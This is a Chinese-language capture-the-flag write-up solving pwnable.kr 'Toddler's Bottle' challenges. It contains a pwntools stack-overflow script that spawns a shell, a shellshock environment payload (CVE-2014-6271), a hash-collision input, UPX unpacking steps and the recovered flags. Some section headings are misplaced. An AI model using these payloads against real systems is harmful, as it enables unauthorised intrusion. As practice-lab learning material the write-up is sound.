## [pwnable.kr](http://pwnable.kr/play.php)

* [Toddler's Bottle](#)
    * [fd](#toddlers-bottle---fd)
    * [collision](#toddlers-bottle---collision)
    * [bof](#toddlers-bottle---bof)
    * [flag](#toddlers-bottle---flag)
    * [TODO: passcode](#toddlers-bottle---passcode)
    * [random](#toddlers-bottle---random)
    * [input](#toddlers-bottle---input)
    * [TODO: leg](#toddlers-bottle---leg)
    * [mistake](#toddlers-bottle---mistake)
    * [shellshock](#toddlers-bottle---shellshock)
    * [coin1](#toddlers-bottle---coin1)

### 总结

pwnable.kr 中的题，除了遇到的每个独立问题外，还需要提升自己的 python - pwn 包应用，nc(NetCat) 命令的应用

### Toddler's Bottle - fd

```sh
$ ssh fd@pwnable.kr -p2222 # guest
fd@ubuntu:~$ cat fd.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234; // 文件描述符
    int len = 0;
    len = read(fd, buf, 32);           // 从fd中读取数据（这里理解为标准输入STDIN_FILENO即可）
    if(!strcmp("LETMEWIN\n", buf)){    // 从fd中读到内容为'LETMEWIN\n'
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```

```sh
fd@ubuntu:~$ ./fd `python -c "print 0x1234"` # stdin
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

扩展学习：[Standard streams](https://en.wikipedia.org/wiki/Standard_streams), [File descriptor](https://en.wikipedia.org/wiki/File_descriptor)

### Toddler's Bottle - collision

```sh
$ ssh col@pwnable.kr -p2222 # guest
col@ubuntu:~$ cat col.c
```

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;            // 冲突md5
unsigned long check_password(const char* p){    // char 类型为1字节
    int* ip = (int*)p;                          // int 类型为4字节
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];   // 可能溢出, int范围[-2^31, 2^31-1]
                        // 利用此处可能溢出漏洞，从0 --> 2^31-1 --[+1]--> -2^31 --> 0
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){                  // 输入20字节
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```

分析：

```c
#include <stdio.h>

unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        printf("[%d]: %d\n", i, ip[i]);
        res += ip[i];
    }
    return res;
}

int main(int argc, char *argv[]) {
    char *a = "FFFFFFFFFFFFFFFF\0\0\0\0";               // #1
    // char *a = "FFFFFFFFFFFFFFFF\xd4\xf0\xc3\x08";    // #2
    printf("%ld\n", check_password(a));
    return 0;
}
```

抽取函数 `check_password` 并利用如上代码 **#1** 先计算出 `FFFF FFFF FFFF FFFF \0\0\0\0` 结果

```sh
$ gcc a.c; ./a.out
[0]: 1179010630
[1]: 1179010630
[2]: 1179010630
[3]: 1179010630
[4]: 0
421075224           # FFFFFFFFFFFFFFFF\0\0\0\0
$ python -c "print 0x21DD09EC - 421075224"  # 计算与期望 0x21DD09EC 差值
147058900
$ python -c "print hex(147058900)"          # 获取 \0\0\0\0 应对应的int值
0x8c3f0d4
```

目标机 `col@pwnable.kr` 为小端地址，因此 `0x8c3f0d4` => `\xd4\xf0\xc3\x08`，利用 **#2** 验证结果

```sh
col@ubuntu:~$ ./col `perl -e 'print "FFFFFFFFFFFFFFFF\xd4\xf0\xc3\x08"'`
daddy! I just managed to create a hash collision :)
```

扩展学习：[Integer (computer science)](https://en.wikipedia.org/wiki/Integer_(computer_science))

参考资料：[pwnable collision - ETenal](https://etenal.me/archives/972#C3)

### Toddler's Bottle - bof

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);       // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

```asm
[0x00000530]> pdf @ sym.main
            ;-- main:
/ (fcn) sym.main 28
|   sym.main ();
|           0x0000068a      55             push ebp
|           0x0000068b      89e5           mov ebp, esp
|           0x0000068d      83e4f0         and esp, 0xfffffff0
|           0x00000690      83ec10         sub esp, 0x10
|           0x00000693      c70424efbead.  mov dword [esp], 0xdeadbeef ; [0xdeadbeef:4]=-1
|           0x0000069a      e88dffffff     call sym.func
|           0x0000069f      b800000000     mov eax, 0
|           0x000006a4      c9             leave
\           0x000006a5      c3             ret
[0x00000530]> pdf @ sym.func
/ (fcn) sym.func 94
|   sym.func (int arg_8h);
|           ; var int local_2ch @ ebp-0x2c
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
|              ; CALL XREF from 0x0000069a (sym.main)
|           0x0000062c      55             push ebp
|           0x0000062d      89e5           mov ebp, esp
|           0x0000062f      83ec48         sub esp, 0x48               ; 'H'
|           0x00000632      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
|           0x00000638      8945f4         mov dword [local_ch], eax
|           0x0000063b      31c0           xor eax, eax
|           0x0000063d      c704248c0700.  mov dword [esp], str.overflow_me_: ; [0x78c:4]=0x7265766f ; "overflow me : "  ; RELOC 32
(reloc.puts_69)
|           0x00000644      e8fcffffff     call reloc.puts_69            ; RELOC 32 puts
|           0x00000649      8d45d4         lea eax, dword [local_2ch]
|           0x0000064c      890424         mov dword [esp], eax
(reloc.gets_80)
|           0x0000064f      e8fcffffff     call reloc.gets_80            ; RELOC 32 gets
|           0x00000654      817d08bebafe.  cmp dword [arg_8h], 0xcafebabe ; [0xcafebabe:4]=-1
|       ,=< 0x0000065b      750e           jne 0x66b
|       |   0x0000065d      c704249b0700.  mov dword [esp], str._bin_sh ; [0x79b:4]=0x6e69622f ; "/bin/sh"  ; RELOC 32
(reloc.system_101)
|       |   0x00000664      e8fcffffff     call reloc.system_101         ; RELOC 32 system
|      ,==< 0x00000669      eb0c           jmp 0x677
|      ||      ; JMP XREF from 0x0000065b (sym.func)
|      |`-> 0x0000066b      c70424a30700.  mov dword [esp], str.Nah..  ; [0x7a3:4]=0x2e68614e ; "Nah.."  ; RELOC 32
(reloc.puts_115)
|      |    0x00000672      e8fcffffff     call reloc.puts_115           ; RELOC 32 puts
|      |       ; JMP XREF from 0x00000669 (sym.func)
|      `--> 0x00000677      8b45f4         mov eax, dword [local_ch]
|           0x0000067a      653305140000.  xor eax, dword gs:[0x14]
|       ,=< 0x00000681      7405           je 0x688
(reloc.__stack_chk_fail_132)
|       |   0x00000683      e8fcffffff     call reloc.__stack_chk_fail_132  ; RELOC 32 __stack_chk_fail
|       |      ; JMP XREF from 0x00000681 (sym.func)
|       `-> 0x00000688      c9             leave
\           0x0000
[0x00000530]>
```

栈空间分配及内存泄露问题，数组溢出即可篡改入参。

```asm
$ r2 bof
[0x00000530]> aaa
...
[0x00000530]> afl
...
[0x00000530]> pdf @ sym.func
/ (fcn) sym.func 94
|   sym.func (int arg_8h);
|           ; var int local_2ch @ ebp-0x2c
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
...
|           0x00000649      8d45d4         lea eax, dword [local_2ch]
...
|           0x00000654      817d08bebafe.  cmp dword [arg_8h], 0xcafebabe ; [0xcafebabe:4]=-1
...
[0x00000530]>
```

由上分析可知，`0x8 - (-0x2c) = 52` 即为 `key` 入参起始栈地址与 `overflowme` 数组起始栈地址之差，输入任意52个字节后，随后4个字节( `sizeof(int)` ) 对应的int值为 `0xcafebabe` 即可（注意大小端问题）

```py
#!/usr/bin/python2
# -*- coding: UTF-8 -*-
from pwn import *

pwn_socket = remote('pwnable.kr', 9000)
pwn_socket.sendline(' ' * 52 + '\xbe\xba\xfe\xca')
pwn_socket.interactive()
```

```sh
➜  pwn python a.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
daddy, I just pwned a buFFer :)
$
[*] Closed connection to pwnable.kr port 9000
```

参考资料：[pwnable bof - ETenal](https://etenal.me/archives/972#C4)

### Toddler's Bottle - flag

    Papa brought me a packed present! let's open it.

    Download : http://pwnable.kr/bin/flag

    This is reversing task. all you need is binary

题意让分析一个二进制文件，这个文件是加过壳的。对反汇编&加壳&去壳并不熟悉，直接找已有资料，学习如何处理此题。

参考 [\[Pwnable.kr\] flag](https://blog.yiz96.com/pwnable-flag/), [pwnable.kr flag - MtuucX](https://asciinema.org/a/111601)

学习资料 [什么是加壳和脱壳技术？加壳和脱壳技术是什么意思？](http://blog.csdn.net/zhu2695/article/details/12208221), [Radare2逆向的正确姿势](http://www.mottoin.com/86269.html)

分析：

1. 尝试运行

```sh
$ wget http://pwnable.kr/bin/flag
$ chmod +x flag
$ ./flag
I will malloc() and strcpy the flag there. take it.
$ radare2 flag      # 没有什么可直接关注到的信息
$ cgdb flag         # b main 并没有成功
```

2. 查看二进制文件 --> 找壳类型

```sh
$ strings flag | head -n 10     # 查看前10个可打印字符串
UPX!
@/x8
gX lw_
H/\_@
        Kl$
H9\$(t
[]]y
nIV,Uh
AWAVAUATS
uSL9
$ strings flag | tail -n 10     # 查看最后10个可打印字符串
;dl]tpR
c3Rh
2B)=
1\a}
_M]h
Upbrk
makBN
su`"]R
UPX!
UPX!
```

`UPX!` 这个是一个关键词，说明原elf文件被加壳保护([UPX](https://upx.github.io/))，直接去壳，再重头分析

3. 去壳 --> 还原为非壳二进制

```sh
$ upx -d flag -o unflag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   unflag

Unpacked 1 file.
```

利用r2dare分析二进制，执行 `r2 -c=H unflag # 用浏览器查看反汇编内容`，找到 `main` 函数入口

```asm
...
0x00401168      sub rsp, 0x10
       ; 0x496658
       ; "I will malloc() and strcpy the flag there. take it."
0x0040116c      mov edi, str.I_will_malloc___and_strcpy_the_flag_there._take_it.
...
0x0040117b      call sym.malloc
0x00401180      mov qword [rbp - 8], rax
   ; [0x6c2070:8]=0x496628 str.UPX...__sounds_like_a_delivery_service_:_
   ; "(fI"
...
```

在 `main` 中我们可看到 `I will malloc() and strcpy the flag there. take it.` 我们在执行 `./flag` 时打印的内容，随后的 `call sym.malloc`, `mov qword [rbp -8], rax` 则调用库函数 `malloc` 动态分配内存空间，并将我们期望的 `flag` 拷贝过去。顺此思路我们找到地址 `0x496628`

```asm
...
0x00496628      .string "UPX...? sounds like a delivery service :)" ; len=42
...
```

DONE!

4. 提交flag，验证结果

**PS**: 看到一种取巧的查找方式，flag去壳后，直接 `$ strings unflag | grep ":)"` 就能找到（`:)` falg都会带的。。。。）

### Toddler's Bottle - passcode

TODO

### Toddler's Bottle - random

```c
#include <stdio.h>

int main(){
    unsigned int random;
    random = rand();        // random value!

    unsigned int key=0;
    scanf("%d", &key);

    if( (key ^ random) == 0xdeadbeef ){
        printf("Good!\n");
        system("/bin/cat flag");
        return 0;
    }

    printf("Wrong, maybe you should try 2^32 cases.\n");
    return 0;
}
```

这题很简单，实现没有加入随即种子，每次独立运行的第一个随机数都是 **1804289383**

```sh
$ python -c "print 0xdeadbeef ^ 1804289383"
3039230856
$ ssh fd@pwnable.kr -p2222 # guest
random@ubuntu:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...
```

### Toddler's Bottle - input

    Mom? how can I pass my input to a computer program?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
        printf("Welcome to pwnable.kr\n");
        printf("Let's see if you know how to give input to program\n");
        printf("Just give me correct inputs then you will get the flag :)\n");

        // argv
        if(argc != 100) return 0;
        if(strcmp(argv['A'],"\x00")) return 0;
        if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
        printf("Stage 1 clear!\n");

        // stdio
        char buf[4];
        read(0, buf, 4);
        if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
        read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
        printf("Stage 2 clear!\n");

        // env
        if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
        printf("Stage 3 clear!\n");

        // file
        FILE* fp = fopen("\x0a", "r");
        if(!fp) return 0;
        if( fread(buf, 4, 1, fp)!=1 ) return 0;
        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
        fclose(fp);
        printf("Stage 4 clear!\n");

        // network
        int sd, cd;
        struct sockaddr_in saddr, caddr;
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd == -1){
                printf("socket error, tell admin\n");
                return 0;
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = INADDR_ANY;
        saddr.sin_port = htons( atoi(argv['C']) );
        if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                printf("bind error, use another port\n");
                return 1;
        }
        listen(sd, 1);
        int c = sizeof(struct sockaddr_in);
        cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
        if(cd < 0){
                printf("accept error, tell admin\n");
                return 0;
        }
        if( recv(cd, buf, 4, 0) != 4 ) return 0;
        if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
        printf("Stage 5 clear!\n");

        // here's your flag
        system("/bin/cat flag");
        return 0;
}
```

这题上来我就用python生成入参调试，连stage 1都过不去。。。。折腾了1个多小时，随后找了几个博主的解析才自己折腾出来。

OK，我们先来分析代码

```c
// argv
if(argc != 100) return 0;
if(strcmp(argv['A'],"\x00")) return 0;
if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
printf("Stage 1 clear!\n");
```

**Stage 1**: 输入100个参数，其中 `argv['A']`(`argv[65]`) 为 `\x00`, `argv['B']`(`argv[66]`) 为 `\x20\x0a\x0d`

知识点：[ASCII](https://zh.wikipedia.org/wiki/ASCII)，命令行参数（可参考 [APUE](https://github.com/YuanFanBin/learn/tree/master/apue) 7.4节）

```c
// stdio
char buf[4];
read(0, buf, 4);
if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
read(2, buf, 4);
if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
printf("Stage 2 clear!\n");
```

**Stage 2**: 从标准输入中读入 `\x00\x0a\x00\xff`，从标准错误中读入 `\x00\x0a\x02\xff`

知识点：[File Descriptor](https://en.wikipedia.org/wiki/File_descriptor)

```c
// env
if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
printf("Stage 3 clear!\n");
```

**Stage 3**: 从环境变量中读入 `\xde\xad\xbe\xef` 所对应的值 `\xca\xfe\xba\xbe`

知识点：环境变量（可参考 [APUE](https://github.com/YuanFanBin/learn/tree/master/apue) 7.5节）

```c
// file
FILE* fp = fopen("\x0a", "r");
if(!fp) return 0;
if( fread(buf, 4, 1, fp)!=1 ) return 0;
if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
fclose(fp);
printf("Stage 4 clear!\n");
```

**Stage 4**:  从文件 `\x0a` 中读入 `\x00\x00\x00\x00` 四个字节

知识点：文件读写

```c
// network
int sd, cd;
struct sockaddr_in saddr, caddr;
sd = socket(AF_INET, SOCK_STREAM, 0);
if(sd == -1){
        printf("socket error, tell admin\n");
        return 0;
}
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons( atoi(argv['C']) );
if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
        printf("bind error, use another port\n");
        return 1;
}
listen(sd, 1);
int c = sizeof(struct sockaddr_in);
cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
if(cd < 0){
        printf("accept error, tell admin\n");
        return 0;
}
if( recv(cd, buf, 4, 0) != 4 ) return 0;
if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
printf("Stage 5 clear!\n");
```

**Stage 5**: TCP网络通信，绑定 `argv['C']` 所对应端口，侦听网络连接，并从TCP连接中读入 `\xde\xad\xbe\xef` 四个字节。

知识点：网络-TCP/IP协议（可参考APUE, UNP）


分析完5个阶段，我们再整体来看一下，**Stage 1**, **Stage 3** 都与进程启动相关，环境变量及入参。**Stage 2**, **Stage 4** 都与文件描述符相关，**Stage 5** 与网络有关，且该进程为 *server* 端。

从 **Stage 5** 可看出，我们需要一个 *client* 端，涉及 *socket*, *connect*, *write* 几个函数，从 **Stage1, Stage3** 可看出我们需要 *fork*, exec函数族中的 *execvpe*, 从 **Stage 2, Stage 4** 可看出我们需要 *pipe*, *dup2*, *fopen*, *fwrite*, *fclose*, 以上内容都涉及到了进程之间通信的概念。

利用 *fork* 函数，fork出一个子进程，子进程用于启动 **input**，并且为其构造 **argv**, **envp**, 同时需要将子进程的*STDIN_FILENO*, *STDERR_FILENO* dup2 到同一个文件描述符上（这里涉及子进程共用父进程资源知识点），还有exec知识点，摘录 [APUE](https://github.com/YuanFanBin/learn/tree/master/apue) 8.10小节内容

    当进程调用一种 exec 函数时，该进程执行的程序完全替换为新程序，而新程序则从其 main 函数开始执行。因为调用 exec 并不创建新进程，所以前后的进程ID并未改变。exec 只是用磁盘上的一个新程序替换了当前进程的正文段、数据段、堆段和栈段。

子进程需要从文件描述符中读入数据，那么我们可以利用 *pipe* 在父子进程之间通信，父进程写入管道，子进程从管道中读出数据，再将 *STDIN_FILENO*, *STDERR_FILENO* dup2 到子进程的管道的读端，**Stage 4** 需要从文件中读入数据，我们在 *execvp* 前优先写入一个文件 `\x0a` 并将指定数据写入文件。**Stage 5** 需要在父进程起 *client* 端，父进程通过TCP与 *server* 的指定端口通信，向其写入指定数据。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>

int main(int argc, char* argv[], char* envp[]) {
    int fd[2];
    pid_t pid;

    if (pipe(fd) < 0) {
        printf("pipe error");
        exit(0);
    }
    if ((pid = fork()) < 0) {
        printf("fork error");
        exit(0);
    }
    if (pid > 0) { /* parent */
        // stage 2
        close(fd[0]);
        write(fd[1], "\x00\x0a\x00\xff\x00\x0a\x02\xff", 8);

        sleep(2);

        // stage 5
        int sockfd;
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            printf("socket error");
            exit(0);
        }
        struct sockaddr_in srvaddr;
        srvaddr.sin_family = AF_INET;
        srvaddr.sin_port = htons(8888); // TODO
        srvaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
        if (connect(sockfd, (struct sockaddr *)&srvaddr, sizeof(srvaddr)) < 0) {
            printf("connect error, %s", strerror(errno));
            exit(0);
        }
        char *buf = "\xde\xad\xbe\xef";
        send(sockfd, buf, strlen(buf), 0);
        close(sockfd);
    } else { /* child */
        // stage 1
        char *c_argv[101] = {0};
        for (int i = 0; i < 100; i++) {
            c_argv[i] = "A";
        }
        argv[100] = NULL;
        c_argv[0] = "/home/fanbin/workspace/pwn/input"; // TODO
        c_argv['A'] = "\x00";
        c_argv['B'] = "\x20\x0a\x0d";
        c_argv['C'] = "8888"; // TODO

        // stage 2
        close(fd[1]);
        if (dup2(fd[0], STDIN_FILENO) < 0) {
            printf("dup2 STDIN_FILENO error");
            exit(0);
        }
        if (dup2(fd[0], STDERR_FILENO) < 0) {
            printf("dup2 STDERR_FILENO error");
            exit(0);
        }

        // stage 3
        char *c_envp[2] =  {"\xde\xad\xbe\xef=\xca\xfe\xba\xbe", NULL};

        // stage 4
        FILE *fp;
        if ((fp = fopen("\x0a", "wb")) == NULL) {
            printf("fopen error");
            exit(0);
        }
        fwrite("\x00\x00\x00\x00", 4, sizeof(char), fp);
        fclose(fp);

        // execvpe
        if (execvpe(c_argv[0], c_argv, c_envp) < 0) {
            printf("execvpe error");
            exit(0);
        }

        exit(0);
    }
    if (waitpid(pid, NULL, 0) != pid) { /* wait for child */
        printf("waitpid error");
    }
    exit(0);
}
```

在/tmp目录下创建一个自己的文件夹，将测试过代码放到创建的文件夹下编译，对原有的可执行文件做软链

```sh
input2@ubuntu:~$ cd /tmp; mkdir yuanfanbin; cd yuanfanbin
input2@ubuntu:/tmp/yuanfanbin$ ln -s /home/input2/input .
input2@ubuntu:/tmp/yuanfanbin$ ln -s /home/input2/flag .
input2@ubuntu:/tmp/yuanfanbin$ gcc setinput.c
input2@ubuntu:/tmp/yuanfanbin$ ls
a.out  flag  input  setinput.c
input2@ubuntu:/tmp/yuanfanbin$ ./a.out
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
Mommy! I learned how to pass various input in Linux :)
input2@ubuntu:/tmp/yuanfanbin$
```

参考资料：[pwnable.kr \[Toddler's Bottle\] - input](http://www.jianshu.com/p/e13f3bc26cd4)

    We all make mistakes, let's move on.
    (don't take this too seriously, no fancy hacking skill is required at all)
    
    This task is based on real event
    Thanks to dhmonkey
    
    hint : operator priority

### Toddler's Bottle - leg

TODO

### Toddler's Bottle - mistake

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        // 操作符优先级, 结果fd=0(STDIN_FILENO)
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        // 从标准输入读入原始密码
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        // 从标准输入读入目标密码
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```

这题有提示，仔细看一下就能解决问题

```sh
mistake@ubuntu:~$ ./mistake
do not bruteforce...
0000000000
input password : 1111111111
Password OK
Mommy, the operator priority always confuses me :(
mistake@ubuntu:~$
```

### Toddler's Bottle - shellshock

```c
#include <stdio.h>
int main() {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
```

这题是一个 *shellshock* 的漏洞，简单看了下其他人的实现。[shellshock(software bug)](https://en.wikipedia.org/wiki/Shellshock_(software_bug))

```sh
shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```

参考资料：[pwnable shellshock - ETenal](https://etenal.me/archives/972#C11)

### Toddler's Bottle - shellshock

```sh
➜  nc pwnable.kr 9007

        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 30 seconds.

        - How to play -
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

        - Ready? starting in 3 sec... -

N=315 C=9
```

此题直接nc连入查看规则，看得出是一道简单的二分查找题，题不难，不过不知道怎么入手去提交解决方案。

参考了参考资料中两位博主的连接方案，发现是需要用 *python* 的pwn模块，回顾之间的用法，自行实现了解决方案

在本地跑任务，总是跑不到100次，20 ~ 30次超时失败了，又参考别人的解决办法才成功得到flag

```py
#!/bin/bash python2
# -*- coding: UTF-8 -*-
'''pwnable.kr - [Toddler's Bottle] coin1'''
from pwn import *
import re

index = []
for n in range(0, 10000):
    index.append(str(n))

pwn_socket = remote('pwnable.kr', 9007)         # 本地做容易超时，最好找一台内部机器执行
print pwn_socket.read() # rule

for i in range(100):
    (n, c) = [int(d) for d in re.search(r'N=(\d+) C=(\d+)', pwn_socket.readline()).groups()]
    print "N=", n, "C=", c

    count = 0
    l, r = 0, n
    while l < r:
        m = (l + r) >> 1
        count += 1
        if count > c:
            pwn_socket.sendline(' '.join(index[l:m]))
            weigh = pwn_socket.read()
            break
        pwn_socket.sendline(' '.join(index[l:m]))
        weigh = pwn_socket.read()
        if int(weigh) % 10 == 0:
            l = m
        else:
            r = m + 1
    print "OK, ", (i)

print pwn_socket.read()
```

```sh
$ ssh fd@pwnable.kr -p2222
fd@ubuntu:/tmp/yuanfanbin$ cd /tmp; mkdir yuanfanbin; cd yuanfanbin; touch test.py
fd@ubuntu:/tmp/yuanfanbin$ vim test.py      # 粘贴代码
fd@ubuntu:/tmp/yuanfanbin$ python test.py
...
N= 656 C= 10
OK,  99
Congrats! get your flag
b1NaRy_S34rch1nG_1s_3asy_p3asy
```

参考资料: [pwnable coin1 - ETenal](https://etenal.me/archives/972#C11), [pwnable coin1 - TaQini852](http://blog.csdn.net/smalosnail/article/details/53129001)
